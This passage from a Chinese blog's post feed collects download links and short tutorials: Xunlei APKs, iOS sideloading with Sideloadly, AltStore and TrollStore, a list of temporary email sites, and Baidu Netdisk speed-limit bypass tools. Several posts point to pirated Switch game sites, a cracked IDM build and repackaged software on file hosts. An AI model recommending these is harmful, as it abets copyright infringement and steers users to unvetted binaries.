<h2 id="迅雷-10-00-0-1000-apk"><a href="#迅雷-10-00-0-1000-apk" class="headerlink" title="迅雷_10.00.0.1000.apk"></a>迅雷_10.00.0.1000.apk</h2><p><a href="https://wwm.lanzouw.com/iOPb60dr2huf">https://wwm.lanzouw.com/iOPb60dr2huf</a> 密码:guzn</p>
<h2 id="迅雷-v7-30-0-7664-apk"><a href="#迅雷-v7-30-0-7664-apk" class="headerlink" title="迅雷_v7.30.0.7664.apk"></a>迅雷_v7.30.0.7664.apk</h2><p><a href="https://wwm.lanzouw.com/iZEJD0dr2kfi">https://wwm.lanzouw.com/iZEJD0dr2kfi</a> 密码:2isi</p>
<h2 id="域·下载器v1-3-3高级版"><a href="#域·下载器v1-3-3高级版" class="headerlink" title="域·下载器v1.3.3高级版"></a>域·下载器v1.3.3高级版</h2><p><a href="https://wwm.lanzouw.com/iXuG40dr56ob">https://wwm.lanzouw.com/iXuG40dr56ob</a> 密码:8bbw</p>
<h2 id="冰冰bt磁力下载器v1-1-3"><a href="#冰冰bt磁力下载器v1-1-3" class="headerlink" title="冰冰bt磁力下载器v1.1.3"></a>冰冰bt磁力下载器v1.1.3</h2><p><a href="https://wwm.lanzouw.com/iGbV10dr5ngf">https://wwm.lanzouw.com/iGbV10dr5ngf</a> 密码:1q3p</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>xunlei</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>xunlei</tag>
      </tags>
  </entry>
  <entry>
    <title>windows 环境下制作 macos u盘安装盘</title>
    <url>/posts/a79c8b00/</url>
    <content><![CDATA[<h1 id="balenaEtcher下载："><a href="#balenaEtcher下载：" class="headerlink" title="balenaEtcher下载："></a>balenaEtcher下载：</h1><p><a href="https://www.balena.io/etcher/">https://www.balena.io/etcher/</a></p>
<h1 id="TransMac下载："><a href="#TransMac下载：" class="headerlink" title="TransMac下载："></a>TransMac下载：</h1><p><a href="https://transmac.en.softonic.com/download">https://transmac.en.softonic.com/download</a></p>
<h1 id="Install-macOS-Monterey-12-5-原版-dmg"><a href="#Install-macOS-Monterey-12-5-原版-dmg" class="headerlink" title="Install macOS Monterey 12.5-原版.dmg"></a>Install macOS Monterey 12.5-原版.dmg</h1><p>链接: <a href="https://pan.baidu.com/s/1daC_7cTNgaTA6bwfqw_8vw?pwd=dzbd">https://pan.baidu.com/s/1daC_7cTNgaTA6bwfqw_8vw?pwd=dzbd</a> 提取码: dzbd 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
]]></content>
      <categories>
        <category>os</category>
        <category>macos</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>macos</tag>
      </tags>
  </entry>
  <entry>
    <title>switch游戏资源下载站分享</title>
    <url>/posts/31ca4455/</url>
    <content><![CDATA[<h1 id="赛高网"><a href="#赛高网" class="headerlink" title="赛高网"></a>赛高网</h1><p> <a href="https://switchvip.com/">https://switchvip.com/</a> </p>
<h1 id="switch520全球白嫖网"><a href="#switch520全球白嫖网" class="headerlink" title="switch520全球白嫖网"></a>switch520全球白嫖网</h1><p><a href="https://xxxxx520.com/">https://xxxxx520.com/</a></p>
<h1 id="nxbrew"><a href="#nxbrew" class="headerlink" title="nxbrew"></a>nxbrew</h1><p><a href="https://nxbrew.com/">https://nxbrew.com/</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>switch</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>switch</tag>
      </tags>
  </entry>
  <entry>
    <title>windows 注册表增强工具</title>
    <url>/posts/c135565e/</url>
    <content><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>我一般卸载都用专业的卸载工具，因为相对于控制面板卸载，专业的卸载工具会自动检测软件的残留文件还有注册表信息，然后它会自动删除这些信息。</p>
<p>这里说到注册表信息，这地方有时候真的不是小白能随便去删除和更改信息的地方。如果你是LSJ，那当我没说！</p>
<p>今天介绍的这款软件，是一款注册表工具，比系统自带的方便好用。来看看叭~~~</p>
<h1 id="软件介绍"><a href="#软件介绍" class="headerlink" title="软件介绍"></a>软件介绍</h1><p>这款软件叫RegistryFinder，是一款注册表内容搜索软件，其原版是国外的一款小软件，由吾爱论坛的@beizi1754 绿化而成的一款小巧软件。<br><img src="/img/regedit/1.webp" alt="640-1663578365230"><br>很多小伙伴问，这跟regedit命令进入的注册表编辑器有什么区别？首先，注册表编辑器有的功能，这款肯定是有的。</p>
<p>点击下面，支持小风：<br>其次，这款软件可以指定搜索位置，比如整个注册表，还是具体的某个位置<br><img src="/img/regedit/2.webp" alt="640-1663578411514"><br>再者，这款软件也可以按搜索键、区分大小写、搜索值、搜索数据、匹配整个字符串等等进行搜索。<br><img src="/img/regedit/3.webp" alt="640-1663578424167"><br>看看我选择了搜索键、搜索值和搜索数据三项，能搜索出所有包括360的选项，这是系统自带的注册表编辑器完全没法比拟的。<br><img src="/img/regedit/4.webp" alt="640-1663578433123"><br>最后，RegistryFinder可以打开离线进注册表，当你进入PE时，你可以指定注册表目录进行离线搜索。</p>
<p>对了，注册表目录在C:\Windows\System32\config下。</p>
<p>强行总结：就注册表的信息搜索查询来说，这款比系统自带好用得太多了，而且绿色小巧，随开随用，非常不错！有需要的文末获取链接下载叭~~~</p>
<h1 id="软件获取"><a href="#软件获取" class="headerlink" title="软件获取"></a>软件获取</h1><p>注册表工具：</p>
<p><a href="https://wwm.lanzouw.com/iJDIM0byvaob">https://wwm.lanzouw.com/iJDIM0byvaob</a> 密码:7c8i</p>
]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>iphone任意安装应用：最详细的自签教程</title>
    <url>/posts/85ec4331/</url>
    <content><![CDATA[<p>自签的方式有很多种，工具也比较多，比如Sideloadly、爱思助手、AltStore等等，还有个人证书售卖价格都不均。我平常用Sideloadly进行签名，觉得是最方便快捷的方式，主要是不花钱，缺点就是有效期7天，要在续签一次。</p>
<h1 id="Sideloadly自签教程"><a href="#Sideloadly自签教程" class="headerlink" title="Sideloadly自签教程"></a>Sideloadly自签教程</h1><p>用Sideloadly自签需要准备：<br>数据线<br>电脑（Windows &#x2F; Mac）<br>iPhone、iPad 或 iPod touch<br>下载Sideloadly安装包到你的电脑上并且安装它，打开它之后，将你的iPhone与电脑连接，想必你也早已经下载好了要安装的ipa，将它拖进Sideloadly（左侧的框内）。<br><img src="/img/sign/1.webp" alt="v2-865e3a890ea8efc3acd87f2aa175c13f_1440w"><br>要输入Apple ID和密码，已经开启了验证的需要提供一个验证码。当然建议大家可以申请一个新的Apple ID用于签名。<br><img src="/img/sign/2.webp" alt="v2-e8393cc2176f5c415def50e6d6ac86f5_1440w"><br>展开可以查看一个进度，百分之百进度时候可以查看桌面是否已经安装到手机，如果有软件图标说明安装完成。此时无法直接打开，可以在 设置–通用–描述文件与设备管理里，找到刚刚用于签名的ID点击刚刚安装好的软件软件对他点击信任，此时表示已经全部完成。<br><img src="/img/sign/3.webp" alt="v2-f01bfd031992279c5c47bb8360686bf7_1440w"><br><img src="/img/sign/4.webp" alt="v2-21579a5b078dfbea6d9ad6c890ba4c76_1440w"></p>
<h1 id="爱思助手签名教程"><a href="#爱思助手签名教程" class="headerlink" title="爱思助手签名教程"></a>爱思助手签名教程</h1><p>上面我们说了用Sideloadly如何进行签名，现在说下爱思助手签名的方法，其实原理都一样，而且你也可以找到符合自己使用习惯的签名工具，这里说一下只是多一个签名工具的选择，不管你用Sideloadly或者爱思助手都可以签名选择其中一个<br>爱思助手官网已经有详细的教程，有些同学可能不会注意去看，爱思助手新版的签名工具在爱思助手–工具箱–ipa签名，我们只说下自签的方法。<br>用爱思助手自签需要准备：<br>数据线<br>电脑（Windows &#x2F; Mac）<br>iPhone、iPad 或 iPod touch<br><img src="/img/sign/5.webp" alt="v2-990e607f8ad362c4ea92c55310552ba6_1440w"><br>点击使用Apple ID签名，然后输入你的ID账号和密码进行签名，设备标识指的是你要给他签名的设备的标识，在打开爱思助手后，插入数据线连接上设备会自动识别。输完ID和密码点击确定。<br><img src="/img/sign/6.webp" alt="v2-612046eee9e73bf9b05646d61e6ecac1_1440w"><br>添加完id会显示到最底部,这个时候你可以点击添加ipa文件，从本地文件夹里选择你要签名的软件。<br><img src="/img/sign/7.webp" alt="v2-1f29d3fa042dad7d2a75296078208049_1440w"><br>添加好ipa后，点击AppleID前和软件前的√勾选，点击开始签名，如果是显示签名成功，代表签名好了，这个时候点击 打开已签名的ipa位置，<br><img src="/img/sign/8.webp" alt="v2-a2603ce8075913604d0850a31f5d5ef7_1440w"><br>签名成功后,点击 已签名的ipa位置,用爱思助手安装到手机,然后,可以在 设置–通用–描述文件与设备管理里，找到刚刚用于签名的ID点击刚刚安装好的软件软件对他点击信任，此时表示已经全部完成。<br>Mac版本上的爱思助手签名略有不同,需要在邮件中信任插件即可.</p>
<h1 id="Altserver签名教程"><a href="#Altserver签名教程" class="headerlink" title="Altserver签名教程"></a>Altserver签名教程</h1><p>如果你用的电脑不是Windows而是Mac系统,那么推荐你Altserver签名工具,感觉很棒.<br>用Altserver自签需要准备：<br>数据线<br>电脑（Mac）<br>iPhone、iPad 或 iPod touch<br>在Mac上下载Altserver签名工具并安装好,点击顶部的类似棱形的图标.打开 AltStore 官方网站「<a href="https://altstore.io」,点击网站主页的「mac」开始下载/">https://altstore.io」，点击网站主页的「Mac」开始下载</a> AltStore 的安装包.<br><img src="/img/sign/9.webp" alt="v2-a1fdad83eb26580e31dbb352ddefd976_1440w"><br>下载完成之后安装,顶部栏图标为棱形的为Altserver签名工具.<br><img src="/img/sign/10.webp" alt="v2-5ea661b9682f13077a71e43608892309_1440w"><br>插入数据线链接设备,接着点击install altstore,然后选择你的设备(我这里的名字是捷径指令大全的iPhone),并且正确输入你的你的Apple ID和密码,如果你的ID开启了二级验证,那么输入你验证密码.然后稍等几秒钟,AltStore就会安装到你的设备.<br>注意:设备和电脑Mac必须连接是同一个Wi-Fi.<br><img src="/img/sign/11.webp" alt="v2-f9e1cda246076ba27189f829bd1f19b8_1440w"><br>如果你输完Apple ID以后,提示以下内容,表示你没有开启插件.<br><img src="/img/sign/12.webp" alt="v2-06d9a2d9fb0c8330898ce7ec918eda42_1440w"><br>如果提示以上内容,打开本地邮件,点击邮件–偏好设置–管理插件,信任这个插件打勾并且重启一下邮件,再回到上一步填入Apple ID等待 altstore 安装到你的手机上,安装完成后手机也会出现altstore图标.<br><img src="/img/sign/13.webp" alt="v2-3e66bc9f7ca6b550870cf33886f3d050_1440w"><br>接下来怎么将ipa安装到手机上,下载ipa文件后,打开方式选择用altstore打开,如果你还没有在手机上打开altstore,导入ipa进入后允许权限,并且输入你的Apple ID和密码用于验证.即可自签完成.<br><img src="/img/sign/14.webp" alt="v2-393fe0f50d4f65dad058d0fa2bb3339a_1440w"><br><img src="/img/sign/15.webp" alt="v2-95fa541c876bcbfb37d45676c01b993d_1440w"><br>然后等待几秒钟到半分钟不等,这个app已经安装好,签名好要信任一下证书.可以在 设置–通用–描述文件与设备管理里，找到刚刚用于签名的ID点击刚刚安装好的软件软件对他点击信任，此时表示已经全部完成。<br>我们看到最多是7天的有效期,也就意味着我们要在这个时间节点在重新签名.<br>使用altstore续签也很简单,同样需要在电脑端后台运行着 AltStore 并与 iPhone 处于同一个 Wi-Fi 的环境下点击 AltStore 中的「Refresh All」来续签全部自签应用。<br><img src="/img/sign/16.webp" alt="v2-ff062838b3273ddd470ef1a444d33355_1440w"><br><img src="/img/sign/17.webp" alt="v2-f8f3dcde6b4b6a55fecdaca4ee17efb5_1440w"></p>
<h1 id="使用总结"><a href="#使用总结" class="headerlink" title="使用总结"></a>使用总结</h1><p>以上三个工具都是不错的自签&#x2F;续签工具,让你在未越狱的设备上任意安装ipa,体验一把越狱的的快乐.<br>在使用过程中,Sideloadly这个工具在Windows表现很好,很简单快捷方便,基本上输入ID,将文件拖入进去,就可以完成.<br>在Mac上,个人感觉altstore要更加好用,也很方便.虽然全英文界面不太友好,但报错也是极少数情况比较马虎所导致的;爱思助手也是支持双平台,感觉也还行,操作略有点麻烦,爱思助手功能比较齐全,也有很多教程可以学习.如果签名失败可以换工具试试.<br>签名工具各有优点,择而选其优,适合自己使用习惯的才是最好的,本教程全部是个人使用经验,码字不易,还请不忘下方点赞支持.</p>
<h1 id="获取方式"><a href="#获取方式" class="headerlink" title="获取方式"></a>获取方式</h1><p>1.Sideloadly签名工具：<a href="https://wwi.lanzoui.com/isAkMs7jc6h">https://wwi.lanzoui.com/isAkMs7jc6h</a><br>2.AltStore 签名工具：<a href="https://altstore.io/">https://altstore.io</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>ios</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title>trollstore 永久签工具支持（已越狱：ios 14.0-14.8.1，非越狱：15.0-15.1.1）</title>
    <url>/posts/f97a136e/</url>
    <content><![CDATA[<h1 id="苹果ipa软件介绍"><a href="#苹果ipa软件介绍" class="headerlink" title="苹果ipa软件介绍"></a>苹果ipa软件介绍</h1><p>一些苹果ipa软件资源，相当于安卓的apk安装包，不过苹果的ipa软件不能像安装那样直接安装，可以借助iTunes、xCode安装、或者iTools等等来安装，当然你如果安装了TrollStore 永久签工具的话最好了，可以利用此工具实现安装永久应用，其他不懂的可以搜索一下教程哈。 </p>
<h1 id="苹果ipa软件安装简单教程"><a href="#苹果ipa软件安装简单教程" class="headerlink" title="苹果ipa软件安装简单教程"></a>苹果ipa软件安装简单教程</h1><p>可以借助TrollStore ，不过对ios系统有要求，越狱用户 iOS 14.0-14.8.1，未越狱用户 iOS 系统仅支持15.0-15.1.1，如果你系统符合的话可以安装TrollStore试试。 </p>
<h1 id="TrollStore-GitHub地址：https-github-com-opa334-TrollStore"><a href="#TrollStore-GitHub地址：https-github-com-opa334-TrollStore" class="headerlink" title="TrollStore GitHub地址：https://github.com/opa334/TrollStore"></a>TrollStore GitHub地址：<a href="https://github.com/opa334/TrollStore">https://github.com/opa334/TrollStore</a></h1><p>安装完TrollStore后，可以使用TrollStore来安装这些ipa软件 其他详细的可以自行研究哈 </p>
<h1 id="苹果ipa软件资源地址"><a href="#苹果ipa软件资源地址" class="headerlink" title="苹果ipa软件资源地址"></a>苹果ipa软件资源地址</h1><h2 id="奇心网盘：https-pan-qxnav-com"><a href="#奇心网盘：https-pan-qxnav-com" class="headerlink" title="奇心网盘：https://pan.qxnav.com"></a>奇心网盘：<a href="https://pan.qxnav.com/">https://pan.qxnav.com</a></h2><h2 id="知网云盘：https-pan-xyyh-xyz"><a href="#知网云盘：https-pan-xyyh-xyz" class="headerlink" title="知网云盘：https://pan.xyyh.xyz"></a>知网云盘：<a href="https://pan.xyyh.xyz/">https://pan.xyyh.xyz</a></h2><h2 id="蜜蜂网盘：https-pan-ios98-com"><a href="#蜜蜂网盘：https-pan-ios98-com" class="headerlink" title="蜜蜂网盘：https://pan.ios98.com"></a>蜜蜂网盘：<a href="https://pan.ios98.com/">https://pan.ios98.com</a></h2><h2 id="dump网盘：https-pan-dumpapp-com"><a href="#dump网盘：https-pan-dumpapp-com" class="headerlink" title="dump网盘：https://pan.dumpapp.com"></a>dump网盘：<a href="https://pan.dumpapp.com/">https://pan.dumpapp.com</a></h2><h2 id="zappfree-https-zappfree-com-ipa-library"><a href="#zappfree-https-zappfree-com-ipa-library" class="headerlink" title="zappfree https://zappfree.com/ipa-library/"></a>zappfree <a href="https://zappfree.com/ipa-library/">https://zappfree.com/ipa-library/</a></h2><h1 id="TrollFools2-7-huami-版"><a href="#TrollFools2-7-huami-版" class="headerlink" title="TrollFools2.7 huami 版"></a>TrollFools2.7 huami 版</h1><p>GitHub 地址 ： <a href="https://github.com/huami1314/TrollFools/releases">https://github.com/huami1314/TrollFools/releases</a><br>TrollFools2.7:<br><a href="https://www.123pan.com/s/oJCLVv-83Jvd?%E6%8F%90%E5%8F%96%E7%A0%81:Cxhy">https://www.123pan.com/s/oJCLVv-83Jvd?提取码:Cxhy</a><br>🎉iOS17.0巨魔资源推荐：<br><a href="https://www.123pan.com/s/oJCLVv-RzBvd.html">https://www.123pan.com/s/oJCLVv-RzBvd.html</a></p>
<p>巨魔IPA资源：<br><a href="https://pan.quark.cn/s/1d1961f8c778">https://pan.quark.cn/s/1d1961f8c778</a><br>iOS超全资源库：<br><a href="https://drive.uc.cn/s/5f684148dc034">https://drive.uc.cn/s/5f684148dc034</a><br>系统助手：<br><a href="https://joia.cn/system">https://joia.cn/system</a><br>十三资源库：<br><a href="https://tool.joia.cn/">https://tool.joia.cn</a><br>可以查询你的设备是否支持越狱或者巨魔等工具</p>
]]></content>
      <categories>
        <category>os</category>
        <category>ios</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title>恒星播放器，可以边下载磁力链接边播放</title>
    <url>/posts/ad4efbbf/</url>
    <content><![CDATA[<p>恒星播放器下载地址：</p>
<p>官网：<a href="https://www.stellarplayer.com/?chan=cs_03">https://www.stellarplayer.com/?chan=cs_03</a></p>
<p>64位（win）：<a href="https://player-update.coldlake1.com/player/20211103155633/Stellar_20211103155633_cs_03_stable_full_x64.exe">https://player-update.coldlake1.com/player/20211103155633/Stellar_20211103155633_cs_03_stable_full_x64.exe</a></p>
<p>32位（win）：<a href="https://player-update.coldlake1.com/player/20211103155633/Stellar_20211103155633_cs_03_stable_full_x86.exe">https://player-update.coldlake1.com/player/20211103155633/Stellar_20211103155633_cs_03_stable_full_x86.exe</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>player</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>player</tag>
      </tags>
  </entry>
  <entry>
    <title>ios 自签工具 sideloadly</title>
    <url>/posts/5e8fc88e/</url>
    <content><![CDATA[<h1 id="准备工具："><a href="#准备工具：" class="headerlink" title="准备工具："></a>准备工具：</h1><p>1.电脑、2.数据线、3.下载Sideloadly、4.ipa安装包</p>
<h1 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h1><h2 id="1-电脑下载Sideloadly"><a href="#1-电脑下载Sideloadly" class="headerlink" title="1.电脑下载Sideloadly"></a>1.电脑下载<a href="https://armconverter.com/sideloadly/SideloadlySetup64.exe">Sideloadly</a></h2><p>pangu8官网 <a href="https://pangu8.com/sideloadly/#">https://pangu8.com/sideloadly/#</a><br>打开软件Sideloadly，手机连接电脑，把iPA拖入软件左侧方框，右侧输入Apple ID(如果不放心，可以注册个Apple小号，然后点击start，等待软件显示100% Done就安装完成了。<br><img src="/img/sideloadly/1.webp" alt="509e88f86077554abfce8af14bfc45a8"></p>
<h2 id="2-安装完成显示"><a href="#2-安装完成显示" class="headerlink" title="2.安装完成显示"></a>2.安装完成显示</h2><p><img src="/img/sideloadly/2.webp" alt="QQ截图20210424221426"></p>
<h2 id="3-不受信任的开发者怎么办"><a href="#3-不受信任的开发者怎么办" class="headerlink" title="3.不受信任的开发者怎么办"></a>3.不受信任的开发者怎么办</h2><p>打开手机——&gt;设置——&gt;通用——&gt;描述文件——&gt;点击安装的iPA信任即可使用！<br><img src="/img/sideloadly/3.webp" alt="QQ截图20210424221516"></p>
<h2 id="4-Sideloadly无法打开解决方法"><a href="#4-Sideloadly无法打开解决方法" class="headerlink" title="4.Sideloadly无法打开解决方法"></a>4.Sideloadly无法打开解决方法</h2><p>Sideloadly找不到Sideloadly.dll的【解决问题】<br><img src="/img/sideloadly/4.webp" alt="4a05ab900aeee7fdb8bc8faf5c87cb0d"><br>浏览文件夹里面的内容会找到一个叫Sideloadly_warp.dll的文件<br><img src="/img/sideloadly/5.webp" alt="d8da5df1f4684346b0cebc439dd80a51"><br>把这个叫Sideloadly_warp.dll的文件重命名成Sideloadly.dll，然后再打开Sideloadly就能用了<br><img src="/img/sideloadly/6.webp" alt="35da12a708337b5d3987d2c6661bad61"></p>
]]></content>
      <categories>
        <category>os</category>
        <category>ios</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title>临时邮箱集合</title>
    <url>/posts/d80606d8/</url>
    <content><![CDATA[<ol>
<li>10 分钟邮箱：<a href="https://linshiyouxiang.net/">https://linshiyouxiang.net/</a> </li>
<li>10 分钟邮箱：<a href="https://10minutemail.net/?lang=zh-cn">https://10minutemail.net/?lang=zh-cn</a> </li>
<li>临时邮箱，十分钟邮箱：<a href="https://www.linshi-email.com/">https://www.linshi-email.com/</a> </li>
<li>60 分钟邮箱：<a href="https://www.moakt.com/zh/mail">https://www.moakt.com/zh/mail</a> </li>
<li>60分钟邮箱：<a href="https://www.guerrillamail.com/zh/">https://www.guerrillamail.com/zh/</a></li>
<li>60 分钟邮箱：<a href="http://www.nowmymail.com/">http://www.nowmymail.com</a> </li>
<li>24 小时邮箱：<a href="http://24mail.chacuo.net/">http://24mail.chacuo.net/</a> </li>
<li>5日邮箱：<a href="http://www.yopmail.com/zh/">http://www.yopmail.com/zh/</a> </li>
<li>10 分钟邮件：<a href="https://10minemail.com/zh/">https://10minemail.com/zh/</a> </li>
<li>Mohmal ：<a href="https://www.mohmal.com/zh">https://www.mohmal.com/zh</a> </li>
<li>TrashSpam ：<a href="https://trashspam.com/cn/">https://trashspam.com/cn/</a> </li>
<li>Mailinator：<a href="http://www.mailinator.com/">http://www.mailinator.com</a> </li>
<li>MailDrop：<a href="https://maildrop.cc/">https://maildrop.cc/</a> </li>
<li>Spambox：<a href="https://spambox.xyz/">https://spambox.xyz/</a> </li>
<li>Temp Mail：<a href="https://temp-mail.org/">https://temp-mail.org/</a> </li>
<li>Temp Mail：<a href="https://mail.tm/">https://mail.tm/</a> </li>
<li>Temp Mail：<a href="https://mail.td/">https://mail.td/</a> </li>
<li>Temp Mail：<a href="https://temp-mail.org/">https://temp-mail.org/</a> </li>
<li>Mailsac Open Source Disposable Email Hosting：<a href="https://mailsac.com/">https://mailsac.com/</a> </li>
<li>Moakt Email：<a href="https://www.moakt.com/">https://www.moakt.com/</a> </li>
<li>Temporary email：<a href="https://dropmail.me/">https://dropmail.me/</a> </li>
<li>Guerrilla Mail：<a href="https://www.guerrillamail.com/">https://www.guerrillamail.com/</a> </li>
<li>Tempinbox：<a href="http://www.tempinbox.com/">http://www.tempinbox.com/</a> </li>
<li>Fakemail：<a href="https://www.fakemail.net/">https://www.fakemail.net/</a> </li>
<li>Free Temporary Email：<a href="https://www.emailondeck.com/">https://www.emailondeck.com/</a> </li>
<li>Mohmal：<a href="https://www.mohmal.com/zh">https://www.mohmal.com/zh</a> </li>
<li>DisposableMail：<a href="https://www.disposablemail.com/">https://www.disposablemail.com/</a> </li>
<li>Temporary Disposable Gmail：<a href="https://gmailnator.com/">https://gmailnator.com/</a> </li>
<li>TempMail：<a href="https://tempmail.net/">https://tempmail.net/</a> </li>
<li>Mail Poof：<a href="https://mailpoof.com/">https://mailpoof.com/</a> </li>
<li>Temp Mail：<a href="https://tempmail.altmails.com/">https://tempmail.altmails.com/</a> </li>
<li>home – ClipMails：<a href="https://www.clipmails.com/">https://www.clipmails.com/</a> </li>
<li>Free Spam Blocker which uses anonymous email：<a href="http://www.mytrashmail.com/">http://www.mytrashmail.com/</a> </li>
<li>10 Minute Mail：<a href="https://10minutemail.com/">https://10minutemail.com/</a> </li>
<li>Temporary Disposable Email：<a href="https://www.tempmailbox.net/">https://www.tempmailbox.net/</a> </li>
<li>Nowmymail：<a href="https://www.nowmymail.com/">https://www.nowmymail.com/</a></li>
</ol>
]]></content>
      <categories>
        <category>tools</category>
        <category>mailbox</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>mailbox</tag>
      </tags>
  </entry>
  <entry>
    <title>破解百度网盘下载限速</title>
    <url>/posts/bde2f00a/</url>
    <content><![CDATA[<h1 id="安装油猴插件CRX"><a href="#安装油猴插件CRX" class="headerlink" title="安装油猴插件CRX"></a>安装油猴插件CRX</h1><p><a href="https://wwm.lanzouw.com/i7rin09qu03e">https://wwm.lanzouw.com/i7rin09qu03e</a> 密码:6wxp</p>
<h1 id="百度网盘千千下载助手"><a href="#百度网盘千千下载助手" class="headerlink" title="百度网盘千千下载助手"></a>百度网盘千千下载助手</h1><p><a href="https://greasyfork.org/zh-CN/scripts/463171-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E5%8D%83%E5%8D%83%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B">https://greasyfork.org/zh-CN/scripts/463171-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E5%8D%83%E5%8D%83%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B</a></p>
<h1 id="Aria2"><a href="#Aria2" class="headerlink" title="Aria2"></a>Aria2</h1><p>Aria2 <a href="https://wwsf.lanzouw.com/iFJzp0u84bkj">https://wwsf.lanzouw.com/iFJzp0u84bkj</a> 密码:1mzv<br><img src="/img/wangpan/1.webp" alt="ebde0c85a7c47492a60034f85b8b40c2"><br><img src="/img/wangpan/2.webp" alt="465e6362ec404fe822f6dbaa7fa0e568"></p>
<h1 id="IDM-v6-38-7-2-中文绿色特别版"><a href="#IDM-v6-38-7-2-中文绿色特别版" class="headerlink" title="IDM v6.38.7.2 中文绿色特别版"></a>IDM v6.38.7.2 中文绿色特别版</h1><p><a href="https://wwm.lanzouw.com/iw8ak09fb9af">https://wwm.lanzouw.com/iw8ak09fb9af</a><br>密码:65nc</p>
<p>设置4线程，修改UA为netdisk<br><img src="/img/wangpan/3.webp" alt="33bbdea4ebf030bf6902b46e875ade28"><br><img src="/img/wangpan/4.webp" alt="93907617f924802a"></p>
<h1 id="百度网盘直链接解析-下载不限速-KinhDown"><a href="#百度网盘直链接解析-下载不限速-KinhDown" class="headerlink" title="百度网盘直链接解析 下载不限速-KinhDown"></a>百度网盘直链接解析 下载不限速-KinhDown</h1><p>百度网盘直链接解析地址<br>解析站点-地址:<a href="https://baidu.kinh.cc/">https://baidu.kinh.cc</a><br>跳转地址1-地址:<a href="https://kdbaidu.com/">https://kdbaidu.com</a><br>跳转地址2-地址:<a href="https://pan.kdbaidu.com/">https://pan.kdbaidu.com</a><br>跳转地址3-地址:<a href="https://yun.kdbaidu.com/">https://yun.kdbaidu.com</a><br>KinhDown官网：<a href="https://kinhdown.com/">https://kinhdown.com/</a></p>
<h1 id="百度网盘便捷客户端下载"><a href="#百度网盘便捷客户端下载" class="headerlink" title="百度网盘便捷客户端下载"></a>百度网盘便捷客户端下载</h1><p><a href="https://wwm.lanzouw.com/iEOMs0dgscza">https://wwm.lanzouw.com/iEOMs0dgscza</a> 密码:e38h</p>
<h1 id="百度网盘下载不限速工具：极下DownLoad"><a href="#百度网盘下载不限速工具：极下DownLoad" class="headerlink" title="百度网盘下载不限速工具：极下DownLoad"></a>百度网盘下载不限速工具：极下DownLoad</h1><p>极下DownLoad解析地址：<a href="https://jx.jixia.ink/#/jxdo">https://jx.jixia.ink/#/jxdo</a><br>极下DownLoad主页：<a href="https://jx.jixia.ink/#/">https://jx.jixia.ink/#/</a></p>
<h1 id="伪PanDownload公测版官下载"><a href="#伪PanDownload公测版官下载" class="headerlink" title="伪PanDownload公测版官下载"></a>伪PanDownload公测版官下载</h1><p>伪PanDownload下载：<a href="https://wwm.lanzouw.com/i0dXT0f911li">https://wwm.lanzouw.com/i0dXT0f911li</a> 密码:ftbn<br>伪PanDownload官网 <a href="https://pandownload.net/index.html">https://pandownload.net/index.html</a></p>
<h1 id="百度盘7-11-0绿色精简版"><a href="#百度盘7-11-0绿色精简版" class="headerlink" title="百度盘7.11.0绿色精简版"></a>百度盘7.11.0绿色精简版</h1><p><a href="https://wwm.lanzouw.com/i5nEB0g6uiub">https://wwm.lanzouw.com/i5nEB0g6uiub</a> 密码:a1w4</p>
<h1 id="克隆窝，提供一个在线百度网盘不限速下载的工具服务"><a href="#克隆窝，提供一个在线百度网盘不限速下载的工具服务" class="headerlink" title="克隆窝，提供一个在线百度网盘不限速下载的工具服务"></a>克隆窝，提供一个在线百度网盘不限速下载的工具服务</h1><p><a href="https://www.kelongwo.com/Resource_function/pan/baidu/">https://www.kelongwo.com/Resource_function/pan/baidu/</a></p>
<h1 id="antdownload-二代无限速下载器，一款Windows端的免费百度网盘下载不限速工具"><a href="#antdownload-二代无限速下载器，一款Windows端的免费百度网盘下载不限速工具" class="headerlink" title="antdownload 二代无限速下载器，一款Windows端的免费百度网盘下载不限速工具"></a>antdownload 二代无限速下载器，一款Windows端的免费百度网盘下载不限速工具</h1><p><a href="https://wwsf.lanzouw.com/iYFyV0ij8ghe">https://wwsf.lanzouw.com/iYFyV0ij8ghe</a> 密码:bhbv</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>wangpan</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>wangpan</tag>
      </tags>
  </entry>
  <entry>
    <title>同声传译，网页翻译，划词翻译，字幕翻译</title>
    <url>/posts/251c5897/</url>
    <content><![CDATA[<h1 id="同声传译"><a href="#同声传译" class="headerlink" title="同声传译"></a>同声传译</h1><h2 id="邦宁同传"><a href="#邦宁同传" class="headerlink" title="邦宁同传"></a>邦宁同传</h2><p>链接: <a href="https://pan.baidu.com/s/186AicdRhqIFC0_5IvFlEQA?pwd=tgwk">https://pan.baidu.com/s/186AicdRhqIFC0_5IvFlEQA?pwd=tgwk</a> 提取码: tgwk 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
